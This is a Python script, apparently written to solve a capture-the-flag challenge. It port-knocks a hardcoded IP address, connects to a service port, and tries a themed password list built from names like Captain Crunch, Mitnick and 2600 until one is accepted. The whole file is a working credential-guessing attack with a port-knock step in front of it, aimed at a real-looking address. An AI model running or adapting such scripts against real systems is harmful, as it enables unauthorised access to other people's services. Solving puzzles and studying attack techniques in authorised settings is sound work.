#!/usr/bin/env python3
"""
Try passwords based on hacker/phreaker history
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    for port in KNOCK_SEQUENCE:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass
        time.sleep(0.2)

def try_pwd(pwd):
    try:
        knock_ports()
        time.sleep(0.3)
        
        s = socket.socket()
        s.settimeout(3)
        s.connect((TARGET_IP, SERVICE_PORT))
        
        s.recv(4096)
        s.send((pwd + "\n").encode())
        time.sleep(0.3)
        
        resp = s.recv(4096).decode('utf-8', errors='ignore')
        s.close()
        
        if "denied" not in resp.lower() and "incorrect" not in resp.lower():
            print(f"\n[+] SUCCESS: '{pwd}'")
            print(resp)
            return True
        return False
    except:
        return False

passwords = [
    # Captain Crunch (John Draper) - famous phone phreaker
    "CaptainCrunch",
    "captaincrunch",
    "JohnDraper",
    "johndraper",
    "Draper",
    "draper",
    
    # Kevin Mitnick - famous hacker
    "Mitnick",
    "mitnick",
    "KevinMitnick",
    
    # Steve Wozniak - blue box creator
    "Wozniak",
    "wozniak",
    "Woz",
    "woz",
    
    # Emmanuel Goldstein - 2600 magazine founder
    "Goldstein",
    "goldstein",
    "Emmanuel",
    
    # Phone phreaking terms
    "bluebox",
    "redbox",
    "blackbox",
    "beigebox",
    "phreaker",
    "phreak",
    
    # Famous frequencies
    "2600hz",
    "2600Hz",
    "2600HZ",
    
    # Whistle frequency (2600 Hz)
    "whistle",
    "Whistle",
    
    # Maybe "His" = the challenge author's
    "Glitch3r2600",
    "glitch3r2600",
    "Glitch3r9000",
    
    # Or "His" = KAAL's specific IMEI
    # If KAAL is a person/entity, what's their number?
    "KAAL2600",
    "kaal2600",
    "KAAL1337",
    "kaal1337",
    
    # Try the magazine name
    "2600Magazine",
    "2600magazine",
    
    # Hacker manifestos
    "Mentor",
    "mentor",
    "TheMentor",
    
    # LOD (Legion of Doom)
    "LOD",
    "lod",
    
    # MOD (Masters of Deception)
    "MOD",
    "mod",
    
    # Try combining with knock sequence
    "captaincrunch9000",
    "mitnick2600",
    "woz1337",
]

print("[*] Hacker History Password Attack\n")

for i, pwd in enumerate(passwords, 1):
    print(f"[{i}/{len(passwords)}] {pwd}", end="... ")
    if try_pwd(pwd):
        break
    else:
        print("✗")
    time.sleep(0.3)
